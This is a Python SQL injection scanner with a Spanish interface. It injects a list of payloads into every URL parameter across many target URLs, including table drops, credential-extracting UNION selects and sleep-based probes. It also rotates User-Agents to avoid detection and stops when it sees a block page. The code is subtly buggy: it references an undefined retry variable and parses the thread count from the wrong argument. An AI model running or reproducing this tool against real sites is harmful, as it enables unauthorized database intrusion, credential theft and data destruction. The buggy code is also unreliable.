import sys
import requests
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
import re
import random
import json
from time import sleep
from colorama import Fore, Style, init

# Inicializar colorama para manejo de colores
init(autoreset=True)
VERDE = Fore.GREEN
CIAN = Fore.CYAN
AZUL = Fore.BLUE
RESET = Style.RESET_ALL

# Lista de payloads comunes de SQLi
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR sleep(5)--",
    "' AND sleep(5)--",
    "'; DROP TABLE users--",
    "admin'--",
    "' OR ''='",
    "1' OR '1'='1",
    "-1 OR 1=1",
    "\" OR \"=\"",
    "' UNION SELECT null, null--",
    "' UNION SELECT username, password FROM users--",
    "1 AND 1=1--",
    "1' AND 1=1--",
    "1' AND sleep(10)--",
    "1 OR sleep(10)--",
    "1' UNION SELECT database(), version()--",
    "\" AND 1=1--",
    "' AND 1=1--",
    "\" OR 1=1--",
    "' OR 'abc'='abc",
    "\" AND \"abc\"=\"abc",
    "' OR 1=1 LIMIT 1--",
    "\" UNION ALL SELECT NULL,NULL--",
    "' OR EXISTS(SELECT 1)--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",
    "' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password='admin')--"
]

# Mensajes comunes que indican bloqueo
BLOCK_MESSAGES = [
    "access denied",
    "blocked",
    "too many requests",
    "403 forbidden",
    "captcha",
    "you have been blocked"
]

# Patrones de errores SQL más específicos para evitar falsos positivos
SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"mysql_fetch",
    r"sql syntax.*?error",
    r"error.*?mysql",
    r"sqlstate\[",
    r"unterminated string literal",
    r"syntax error.*?near",
    r"warning: mysql",
    r"query failed",
    r"invalid input syntax for type",
    r"pg_query\(\): Query failed",
    r"unexpected end of SQL command",
    r"Error converting data type",
    r"ORA-00933: SQL command not properly ended",
    r"ORA-01756: quoted string not properly terminated",
    r"SQL command not properly ended",
    r"PL/pgSQL function returned error",
    r"division by zero",
    r"syntax error at or near",
    r"unrecognized token",
    r"missing right parenthesis",
    r"unexpected token",
    r"unterminated quoted string",
    r"quoted string too long",
    r"column not allowed here",
    r"inconsistent datatypes",
    r"missing expression",
    r"invalid character value",
    r"SQLSTATE",
    r"ambiguous column name"
]

# Lista de User-Agents aleatorios
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/72.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.246",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
]

DEFAULT_THREADS = 10
# Retardo entre reintentos en segundos
RETRY_DELAY = 2

# Lista para almacenar URLs vulnerables
vulnerable_urls = []

# Mostrar el banner
def mostrar_banner():
    print(f"{VERDE}#########################################################{RESET}")
    print(f"{CIAN}#                                                       #{RESET}")
    print(f"{VERDE}#            ████▓▒░  SQLi 5c4nn3r  ░▒▓████            #{RESET}")
    print(f"{CIAN}#                                                       #{RESET}")
    print(f"{VERDE}#########################################################{RESET}")
    print(f"{AZUL}#              ▓▒░ Creado por: C1ph3rByt3               #{RESET}")
    print(f"{VERDE}#########################################################{RESET}")
    print()

# Función para guardar URLs vulnerables opcionalmente
def guardar_url_vulnerable(url, payload, archivo_salida):
    """Guardar URL vulnerable en el archivo JSON si se proporciona archivo_salida"""
    entrada = {
        "url": url,
        "payload": payload
    }
    vulnerable_urls.append(entrada)

    if archivo_salida:
        with open(archivo_salida, "a") as f:
            f.write(json.dumps(entrada) + "\n")
        print(f"[💾] URL vulnerable guardada: {url}")

# Función para validar URLs
def validar_url(url):
    """Validar que la URL tenga formato correcto y contenga parámetros"""
    parsed_url = urlparse(url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print(f"[⚠️] URL inválida: {url}")
        return False
    if not parsed_url.query:
        print(f"[ℹ️] La URL no contiene parámetros: {url}")
        return False
    return True

# Función para identificar patrones de errores SQL
def es_error_sql(respuesta_texto):
    """Verifica si la respuesta contiene un error SQL más específico"""
    for pattern in SQL_ERROR_PATTERNS:
        if re.search(pattern, respuesta_texto.lower()):
            return True
    return False

# Función para probar vulnerabilidades SQLi
def probar_sqli(url, archivo_salida):
    """Prueba todos los parámetros de la URL para SQLi"""
    print(f"[🌐] Procesando URL: {url}")
    if not validar_url(url):
        return

    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    params = {key: value[0] for key, value in params.items()}

    for param in params:
        print(f"[🔍] Probando parámetro: {param}")
        for payload in SQLI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            test_url = f"{url.split('?')[0]}?{urlencode(test_params)}"

            headers = {
                "User-Agent": random.choice(USER_AGENTS)
            }

            try:
                response = requests.get(test_url, headers=headers, timeout=5)
                status_code = response.status_code

                if status_code in [403, 429] or any(block_msg in response.text.lower() for block_msg in BLOCK_MESSAGES):
                    print(f"[🚫] Posible bloqueo detectado en: {test_url} (HTTP {status_code})")
                    return

                if es_error_sql(response.text):
                    print(f"[❗] Vulnerabilidad detectada en {param} con payload: {payload}")
                    guardar_url_vulnerable(test_url, payload, archivo_salida)
                    return

            except requests.exceptions.RequestException:
                print(f"[⚠️] Error al intentar conectar con: {test_url} (Intento {intento + 1})")
                sleep(RETRY_DELAY)

    print(f"[🛡️] No se detectaron vulnerabilidades en la URL: {url}")

# Función principal
def main(ruta_archivo, max_hilos, archivo_salida, url_unica):
    """Lee el archivo con las URLs o prueba una única URL"""
    mostrar_banner()
    try:
        if url_unica:
            print(f"[🔍] Probando URL única: {url_unica}")
            probar_sqli(url_unica, archivo_salida)
        else:
            with open(ruta_archivo, 'r') as file:
                urls = [line.strip() for line in file.readlines() if line.strip()]

            print(f"[🔍] Total de URLs a probar: {len(urls)}")
            print(f"[⚙️] Máximo de hilos: {max_hilos}")

            with ThreadPoolExecutor(max_workers=max_hilos) as executor:
                for url in urls:
                    if not url.startswith("http"):
                        url = "http://" + url
                    executor.submit(probar_sqli, url, archivo_salida)

        print("\n[📋] Resumen de URLs vulnerables:")
        for entrada in vulnerable_urls:
            print(f" - {entrada['url']} con payload: {entrada['payload']}")

    except FileNotFoundError:
        print(f"[❌] Archivo {ruta_archivo} no encontrado.")
    except Exception as e:
        print(f"[❌] Error inesperado: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python sqli_scanner.py [-i <archivo_de_urls.txt>] [-u <url>] [-t <hilos>] [-o <archivo_salida>]")
    else:
        ruta_archivo = None
        url_unica = None
        max_hilos = DEFAULT_THREADS
        archivo_salida = None

        if "-i" in sys.argv or "--input-file" in sys.argv:
            try:
                if "-i" in sys.argv:
                    ruta_archivo_index = sys.argv.index("-i") + 1
                else:
                    ruta_archivo_index = sys.argv.index("--input-file") + 1
                ruta_archivo = sys.argv[ruta_archivo_index]
            except IndexError:
                print("[❌] Archivo de entrada no especificado.")
                sys.exit(1)

        if "-u" in sys.argv or "--url" in sys.argv:
            try:
                if "-u" in sys.argv:
                    url_unica_index = sys.argv.index("-u") + 1
                else:
                    url_unica_index = sys.argv.index("--url") + 1
                url_unica = sys.argv[url_unica_index]
            except IndexError:
                print("[❌] URL no especificada.")
                sys.exit(1)

        if "-t" in sys.argv or "--threads" in sys.argv:
            try:
                if "-t" in sys.argv:
                    max_hilos_index = sys.argv.index("-t") + 1
                else:
                    max_hilos_index = sys.argv.index("--threads") + 1
                max_hilos = int(max_hilos_index)
            except (IndexError, ValueError):
                print("[❌] Valor de hilos inválido. Usando el valor predeterminado de 10.")

        if "-o" in sys.argv or "--output-file" in sys.argv:
            try:
                if "-o" in sys.argv:
                    archivo_salida_index = sys.argv.index("-o") + 1
                else:
                    archivo_salida_index = sys.argv.index("--output-file") + 1
                archivo_salida = sys.argv[archivo_salida_index]
            except IndexError:
                print("[❌] Archivo de salida no especificado. No se guardarán resultados.")

        if not ruta_archivo and not url_unica:
            print("[❌] Debe especificar un archivo de entrada (-i) o una URL única (-u).")
            sys.exit(1)

        main(ruta_archivo, max_hilos, archivo_salida, url_unica)
